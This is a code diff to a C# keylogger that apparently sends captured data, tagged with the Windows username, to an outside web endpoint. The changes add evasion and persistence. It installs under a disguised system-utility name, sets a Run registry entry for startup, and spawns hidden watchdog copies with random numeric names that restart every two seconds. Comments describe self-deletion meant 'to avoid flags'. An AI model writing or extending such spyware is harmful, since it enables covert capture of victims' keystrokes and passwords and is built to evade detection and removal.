@@ -19,7 +19,8 @@ namespace KeyLogger
         private static readonly HttpClient client = new HttpClient();
         private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;
 
-        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsSystemUtility", "WinSysUtils.exe");
+        private static string InstallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsSystemUtility");
+        private static string InstallPath = Path.Combine(InstallDir, "WinSysUtils.exe");
 
         private static bool[] lastKeyState = new bool[256];
 
@@ -29,7 +30,8 @@ namespace KeyLogger
         [STAThread]
         static void Main(String[] args)
         {
-            if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+            string disableVar = Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER");
+            if (string.Equals(disableVar, "true", StringComparison.OrdinalIgnoreCase))
             {
                 // If disabled, also try to kill any running instance from the install path
                 // to make it "stop" as requested.
@@ -39,13 +41,12 @@ namespace KeyLogger
                     {
                         try
                         {
-                            if (process.ProcessName.Equals("WinSysUtils", StringComparison.OrdinalIgnoreCase) || 
-                                process.ProcessName.Equals("KeyLogger", StringComparison.OrdinalIgnoreCase))
+                            string fileName = "";
+                            try { fileName = process.MainModule.FileName; } catch { continue; }
+
+                            if (fileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
                             {
-                                if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
-                                {
-                                    process.Kill();
-                                }
+                                process.Kill();
                             }
                         }
                         catch { }
@@ -73,7 +74,7 @@ namespace KeyLogger
             new Thread(() => {
                 while (true)
                 {
-                    Thread.Sleep(5000);
+                    Thread.Sleep(2000);
                     if (!IsWatchdogRunning())
                     {
                         StartWatchdog();
@@ -216,6 +217,12 @@ namespace KeyLogger
                     // Start the installed version
                     Process.Start(InstallPath);
 
+                    // Re-register for startup just in case it was deleted
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                    {
+                        key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
+                    }
+
                     // Self-deletion of the original executable
                     // We'll use a slightly different approach to try and avoid flags
                     // but still satisfy the user's "move itself" requirement.
@@ -260,10 +267,7 @@ namespace KeyLogger
                 {
                     if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                     {
-                        if (process.Id != Process.GetCurrentProcess().Id)
-                        {
-                            return true;
-                        }
+                        return true;
                     }
                 }
                 catch { }
@@ -273,18 +277,21 @@ namespace KeyLogger
 
         private static bool IsWatchdogRunning()
         {
-            foreach (var process in Process.GetProcessesByName("WinSysUtils"))
+            foreach (var process in Process.GetProcesses())
             {
                 try
                 {
-                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                    string name = process.ProcessName;
+                    if (name.Length == 12 && name.All(char.IsDigit))
                     {
-                        // We can't easily check args of other processes, but the watchdog will be a SECOND process 
-                        // running from the same path.
-                        if (process.Id != Process.GetCurrentProcess().Id)
+                        try
                         {
-                            return true;
+                            if (process.MainModule.FileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
+                            {
+                                return true;
+                            }
                         }
+                        catch { }
                     }
                 }
                 catch { }
@@ -296,7 +303,21 @@ namespace KeyLogger
         {
             try
             {
-                Process.Start(InstallPath, "--watchdog");
+                Random r = new Random();
+                string randName = "";
+                for (int i = 0; i < 12; i++) randName += r.Next(0, 10).ToString();
+                
+                string watchdogPath = Path.Combine(InstallDir, randName + ".exe");
+                File.Copy(InstallPath, watchdogPath, true);
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = watchdogPath,
+                    Arguments = "--watchdog",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                Process.Start(psi);
             }
             catch { }
         }
